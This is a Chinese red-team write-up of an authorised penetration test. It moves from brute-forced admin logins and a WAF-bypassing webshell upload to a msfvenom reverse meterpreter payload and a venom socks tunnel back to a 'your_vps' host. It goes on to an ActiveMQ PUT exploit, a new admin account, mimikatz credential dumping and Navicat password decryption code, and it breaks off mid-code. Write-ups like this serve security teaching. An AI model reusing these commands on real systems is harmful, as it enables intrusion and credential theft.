2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
蝴蝶效应翻起的内⽹漫游巨浪
原创 队员编号001 酒仙桥六号部队 6⽉9⽇
这是 酒仙桥六号部队 的第 15 篇⽂章。
全⽂共计4684个字，预计阅读时⻓14分钟。
背背背背背背背背背背背背背背背景景景景景景景景景景景景景景景
某周末接到⼀个安全评估的⼯作。在客户充分授权的情况下，拿到客户指定的⼏个IP。开始前
期的信息收集，由于这次给予的范围窄，且⽬的是需要搞进内⽹，在信息收集的阶段需要格外
的仔细。前辈说渗透测试的本质是信息收集，这决定着之后的进度。端⼝、C段、指纹、路
径、fofa......⼀步⼀步的探测。有收获也有经常碰到的就⼀个Nginx⻚⾯的情况，实属正常，
在对收集的信息汇总后，把重⼼放在了收集到的两个后台上。
⼀⼀⼀⼀⼀⼀⼀⼀⼀⼀⼀⼀⼀⼀⼀、、、、、、、、、、、、、、、 外外外外外外外外外外外外外外外⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹渗渗渗渗渗渗渗渗渗渗渗渗渗渗渗透透透透透透透透透透透透透透透
1.1 解析漏洞
前期我们进⾏了⼤量的信息收集⼯作，在⽬标的某个路径跳转处发现⼀个后台，
看到输⼊框就想猜⼀猜，在猜不出来的时候且没有验证码的情况下，上⼯具套字
典使劲撸。运⽓不错，简单的判断了⼀次存在admin⽤户，密码尝试了⼀次发现
是弱⼝令xxxxxx成功进⼊后台。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 1/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
进到后台后点点点，在更改表识的地⽅发现⼀个上传的功能点，测⼀测后发现解
析漏洞shell到⼿，当把拿到的shell⾸先跟客户进⾏确认，很遗憾，社会教我做
⼈，由于同⼀个主机上托管了不同客户的资产，甲⽅说这并不是他们的资产，也
就是说我们的第⼀发⼦弹打歪了。。。。。。
1.2 上传漏洞
情况不是多么的离谱，毕竟得接受挂在⽬标主机上的并不⼀定会是客户的资产，
既然这个不⾏，那就回到另⼀个后台，看看有什么突破。依旧没有验证码，熟悉
的味道，这种单位的这种安全意识，我很能理解，⽬标单位还没有建⽴起完善的
⽹络安全体系。
不过这次猜⼀猜的效果不太好，并没有直接猜出来。但可确定的是存在admin⽤
户，没有验证码，直接上burpsuite，⽤上klion前段时间放出来字典结合平时
⾃⼰收集的字典进⾏暴⼒破解。拿到密码，成功进⼊后台。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 2/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
进了后台看了看各个功能模块，测了测发现个越权，但是对拿到权限并没有什么
太⼤的帮助，继续仔细的测试，在前台图⽚更换的⼀个功能的位置，可以上传新
的图⽚进⾏展示，使⽤⾃⼰常⽤的图⽚⻢上传，抓包把上传图⽚⻢的后缀改
成.php。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 3/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
发现直接上传时会提示失败，应该是有WAF的防护，最后使⽤换⾏的⽅式成功
绕过了⽂件名检测，成功上传，且返回了上传的图⽚⻢路径。
结合原本就存在的图⽚，查看图⽚路径，跟上传后返回的路径进⾏拼接后访问，
成功解析，但仅拿到了⽬标服务器的web权限。
⼆⼆⼆⼆⼆⼆⼆⼆⼆⼆⼆⼆⼆⼆⼆、、、、、、、、、、、、、、、内内内内内内内内内内内内内内内⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹穿穿穿穿穿穿穿穿穿穿穿穿穿穿穿透透透透透透透透透透透透透透透
2.1 msf⽣成payload反弹
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 4/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
内核版本为3.10.0，在尝试多种提权⽅式⽆果的情况下，决定使⽤msfvenom
⽣成的payload反弹⼀个meterpreter进⾏后续的操作，使⽤如下命令⽣成⼀
个pentest.elf的payload。
1 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=your_vps
把⽣成的pentest.elf通过⼤⻢上传到⽬标服务器后，使⽤chmod命令赋予执⾏
权限。
在公⽹的VPS上开启监听，然后在⼤⻢上输⼊./pentest.elf执⾏payload，公
⽹的vps收到meterpreter会话。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 5/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
2.2 添加路由进⾏服务刺探
⽬前获取到meterpreter会话，可知道被控机器为Linux服务器，允许访问外
⽹，通过查看路由，发现⽬前所控的Linux机器，可通内⽹的两个⽹段。 分别
是192.xxx.xxx.xxx，10.xxx.xxx.xxx这两个⽹段。这⾥通过autoroute模块
直接添加路由，并使⽤metasploit的渗透模块对这个两个⽹段的服务进⾏探
测。
1 meterpreter > run get_local_subnets //获取当前机器的所有⽹段信息
2
3 meterpreter > run autoroute -s 192.168.0.0/24 //添加⽬标内⽹0⽹
4
5 meterpreter > run autoroute -p //打印当前添加的路由表信息
6
7 meterpreter > background
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 6/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
这⾥相当于在meterpreter的基础上添加了⼀条去往“内⽹”的路由，直接使⽤
metasploit去访问原本不能直接访问的内⽹资源，只要路由可达我们即可使⽤
metasploit⾃带的渗透模块来进⾏探测。
在⽬前已知的两个⽹段中，对主机的服务进⾏刺探后发现没法直接通过⼀些常⻅
的系统级漏洞拿到⽬前两个⽹段中的服务器权限，且在低线程的情况下对常⽤的
服务进⾏爆破⽆果。
2.3 配置venom代理
为了更⽅便的在内⽹中快速扩⼤战果，进⼊到内⽹核⼼区域。我们需要搭建⼀条
通向内⽹的“专属通道”，此次遇到的⽹络环境，⽬标机可以正常访问互联⽹。
在⽬前被控机器上使⽤reGeorg和EarthWorm均存在⼀定问题的情况下，经测
试使⽤venom正常，这⾥使⽤venom搭建代理，⾛socks5协议直接把内⽹的
全部流量都代理出来。
把venom的admin端跟agent端分别上传到⾃⼰公⽹的vps和被控的linux服务
器上。
使⽤如下命令启动admin监听端⼝，并在agent端发起连接，建⽴后可以使⽤
goto 1进⼊⽬前被控linux机器的节点。
1 ./admin_linux_x64 -lport 9999
2
3 ./agent_linux_x64 -rhost your_vps -rport 9999
再使⽤命令socks 7878，建⽴到Linux服务器节点的socks5代理，最后在本
地使⽤proxifier输⼊vps的ip跟刚设置的端⼝即可在本地直接访问内⽹资源。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 7/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
三三三三三三三三三三三三三三三、、、、、、、、、、、、、、、内内内内内内内内内内内内内内内⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹⽹信信信信信信信信信信信信信信信息息息息息息息息息息息息息息息收收收收收收收收收收收收收收收集集集集集集集集集集集集集集集
3.1 探测
为了降低被发现的概率，在内⽹中尽量不要直接上来就是⼀顿操作猛如⻁的扫来扫
去，在部署了nids、hids等各类安全检测设备的情况下，极容易被发现，然后丢掉⼊
⼝点。更好的⽅式是我们需要测试哪⼀类的服务是否存在漏洞，直接针对这个服务来
进⾏探测，且探测的时候注意要调低线程。这⾥直接对⼀些常⻅的web服务进⾏探测
收集整理，汇总了部分存在各种服务的列表。
3.2 数据库密码
依旧使⽤⽼⽅法，柿⼦要挑软的捏，针对已探测到的服务，先测试是否存在弱⼝令。
admin xxxxxxxxx进⼊了其中⼀个某某管理服务的后台，翻了翻，看到查询接⼝，顺
⼿测⼀测是否存在sql注⼊，没有发现注⼊点。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 8/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
测试了所有的功能模块，没有发现可利⽤点，看到数据节点名称的时候，突然灵机⼀
动，直接输⼊了数据节点名称后去看了⼀下返回包，有意思的来了，在返回数据包中
直接返回了该节点对应的数据库的IP、账号和密码。
使⽤⼯具NavicatPremium测试连接，发现使⽤泄露出来的账号密码可直接远程登
录。
登录数据库后共发现有三个⽤户名密码，先记录下来，为之后批量爆破数据库做准
备。
3.3 PUT任意写⼊
在之前进⾏服务探测的时候，发现存在⼀个ActiveMQ的服务，顺⼿⼀测，ActiveMQ
后台的默认密码并没有更改，使⽤默认密码admin admin直接进⼊后台，先看⼀下
ActiveMQ的版本，发现是5.10.0，⽼版本，有戏。在ActiveMQ⽼版本是存在PUT任
意写⼊跟反序列化漏洞的。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 9/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
对于能上传shell，现在还缺⼀个ActiveMQ的物理路径,⽤于在MOVE⽂件的时候。这
个物理路径是可以直接爆出来的。
ActiveMQ默认开启PUT⽅法，当fileserver存在时我们可以上传jspwebshell，现在
路径也有了，顺⼿就是⼀个jsp⻢扔上去，成功解析，⽽且还是system权限。
使⽤tasklist查看所有开放的端⼝，发现3389端⼝赫然在列，添加⼀个新的⽤户，加
⼊管理员组，成功登录。
收集⼀下windows服务器的密码，使⽤minikatz抓取。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 10/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
利⽤抓取到的windows服务器的密码，使⽤⼯具爆破windows服务器，除了已经拿到
的这个windows服务器，另外还有四台服务器密码相同。
3.4 Navicat连接密码解密
依次登录windows服务器，发现其中⼀台windows服务器上存在Navicat，直接打
开，对Navicat连接密码解密。
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 11/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
1 version = $version;
15 $this->blowKey = sha1('3DC5CA39', true);
16 $this->blowIv = hex2bin('d9c7c3c8870d64bd');
17 }
18
19 public function encrypt($string)
20 {
21 $result = FALSE;
22 switch ($this->version) {
23 case 11:
24 $result = $this->encryptEleven($string);
25 break;
26 case 12:
27 $result = $this->encryptTwelve($string);
https://mp.weixin.qq.com/s/CZyGa4_oxgfI7RBbN-qAnw 12/25
2020/7/27 蝴蝶效应翻起的内⽹漫游巨浪
28 break;
29 default:
30 break;
31 }
32
33 return $result;
34 }
35